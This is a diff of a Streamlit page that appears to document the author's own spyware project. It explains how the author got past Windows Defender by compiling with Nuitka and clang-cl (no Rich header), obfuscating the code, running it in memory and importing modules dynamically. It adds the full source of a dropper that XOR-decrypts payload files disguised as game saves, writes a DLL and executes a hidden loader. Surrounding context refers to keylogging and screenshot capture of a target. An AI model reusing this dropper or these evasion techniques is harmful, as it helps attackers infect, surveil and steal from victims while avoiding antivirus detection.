@@ -527,7 +527,7 @@ More advanced components (e.g. rootkits) would likely require C/C++ to interact 
     """ % url_forum_2)
     
     st.write("""
-    But with nuitka and the *--clang* option, i found that the Rich header doesn't exist at all. With PE-Bear i analysed the dropper
+    But with nuitka and the *--clang* option, i was astonished to found that the Rich header doesn't exist at all. With PE-Bear i analysed the dropper
     (only executable file of the malware) and the Rich Header is unvailable, because of the use of clang-cl compilator (no Microsoft toolset),
     even if we running it in a windows environment. The Clang-CL compilor will not place windows artifacts like Rich Header.     
              """)
@@ -535,23 +535,6 @@ More advanced components (e.g. rootkits) would likely require C/C++ to interact 
     ROOT_DIR = Path(__file__).resolve().parents[1]  
     pe_bear = ROOT_DIR / "image" / "pe_bear.jpg"
     st.image(str(pe_bear), caption="The Rich header hash is not available, because the ReaderHash doesn't exist")
-    
-    ###A COMPLETER
-    st.write("""
-    Hypothesis One : PE HEADER FORMAT
-    Without the Rich Header, Windows Defender loses an identifier fragment, it can't make a relation (around the compilation chain) between
-    the program and known malware for exemple. At this point, i didn't find information about why i can bypass 
-    Windows Defender without the Rich Header, maybe this PE header fragment has no importance during static analysis (performed by Windows Defender). 
-    At this stage, it's more  a deduction than a certainty, so take it with a pinch of salt. 
-    
-    
-    Hypothesis Two : OBFUSCATION CODE:
-    The second possiblity is the use of LLVM front-end. The C code (traduce by Nuitka from the python source code) will be transform
-    in a Intermediate Representation...
-    
-    PARLER DES IMPORTS ET DES METHODES UTILISEES
-             """)
-    
 
     st.markdown("<h3 style='text-align: center;'>Dynamic problem</h3>", unsafe_allow_html=True)
     
@@ -646,10 +629,106 @@ Key.cmdKey.tabjhgjygyjgjKey.esc
     st.code(proff_keylog_stealh)
     
     st.write("As you can see, we can elaborate an understanding of what the target doing with screenshot AND keylogs.")
-     
+    
+    
+    st.markdown("<h3 style='text-align: center;'>Why it's work ?</h3>", unsafe_allow_html=True)
 
+
+        ###A COMPLETER
+    st.write("""
+    One : PE HEADER FORMAT
+    Without the Rich Header, Windows Defender loses an identifier fragment, it can't make a relation (around the compilation chain) between
+    the program and known malware for exemple. At this point, i didn't find information about why i can bypass 
+    Windows Defender without the Rich Header, maybe this PE header fragment has no importance during static analysis (performed by Windows Defender). 
+    At this stage, it's more  a deduction than a certainty, so take it with a pinch of salt. 
     
     
+    Two : OBFUSCATION CODE:
+    The second possiblity is the use of LLVM front-end. The C code (traduce by Nuitka from the python source code) will be transform
+    in a Intermediate Representation and it can help to obfuscate the code. Nuitka will "traduce" the python code using libpython and the 
+    intermediate code is very hard to read. It can be use as an obfuscation, additionally, the junk code will help because it will be also 
+    "traduce" by Nuitka. But the thing is, only the dropper is compilate, and that's
+    why our third hypothesis is...
+    
+      
+    Three : Nuitka, C and libpython:
+    The traduce-by-Nuitka dropper will use libpython for interpreting the code. It will execute it direclty into the memory, 
+    that can bypass AV detection. Windows Defender (in our scope) is file-dependent and need visibility to avoid threat. That why
+    the dynamic code can easily bypass the AV. 
+    
+    Four: Technique import:
+    To import module, i used importlib. He will import library dynamically, so during the code execution. You will see how it works below 
+    with the dropper code. 
+    
+             """)
+    
+    code_dropper ="""
+    from pathlib import Path
+    import importlib
+    import tempfile
+
+
+    misterio = ['o'+'s','sy'+'s']
+    o = importlib.import_module(misterio[0])
+    sss = importlib.import_module(misterio[1])
+
+    import os, sys
+
+    def get_data_path(filename):
+        if getattr(sys, 'frozen', False):
+            return os.path.join(sys._MEIPASS, filename)
+        return os.path.join(os.path.abspath("."), filename)
+
+
+    def xor_dec(data: bytes, key: bytes) -> bytes:
+        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+
+    yek = 'SHAD0WKEY'.encode()
+    temp_path = get_data_path(tempfile.gettempdir())
+
+    repertoire = Path(get_data_path("game_saved"))
+
+
+    for fichier in repertoire.iterdir():
+        
+        if ".xor" in fichier.name:
+            
+            with open(fichier, "rb") as f:
+                encrypted = f.read()
+                decrypted = xor_dec(encrypted, yek)
+                
+                    
+            file_name_nom = fichier.name.replace(".xor", ".py")
+            chemin_sortie = Path(temp_path) / file_name_nom
+            
+            with open(chemin_sortie, "wb") as out:
+                out.write(decrypted)
+                
+    call_path = get_data_path("danse_with_me.xor")   
+            
+    with open(call_path, "rb") as f:
+        
+                encrypted = f.read()
+                
+                decrypted = xor_dec(encrypted, yek)
+                
+    file_name_nom = call_path.replace(".xor", ".dll")
+
+    chemin_sortie = get_data_path(Path(".") / file_name_nom)
+
+    with open(chemin_sortie, "wb") as out:
+        out.write(decrypted)            
+                
+    loader = get_data_path("rename_game.xor")
+
+    with open(loader, "rb") as f:
+            encrypted = f.read()
+            
+    decrypted = xor_dec(encrypted, yek)
+
+    exec(decrypted.decode("utf-8"))
+    """
+    st.code(code_dropper, language="python")    
 
 
     
